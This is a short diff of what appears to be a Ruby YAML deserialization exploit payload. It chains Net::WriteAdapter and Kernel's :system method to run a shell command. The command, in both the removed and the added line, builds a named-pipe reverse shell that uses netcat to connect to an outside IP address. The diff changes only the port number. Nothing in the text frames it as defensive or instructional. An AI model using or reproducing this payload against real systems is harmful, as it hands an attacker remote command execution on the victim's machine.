@@ -15,5 +15,5 @@
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
-             git_set: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 159.65.128.101 9393 >/tmp/f"
+             git_set: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 159.65.128.101 1234 >/tmp/f"
          method_id: :resolve
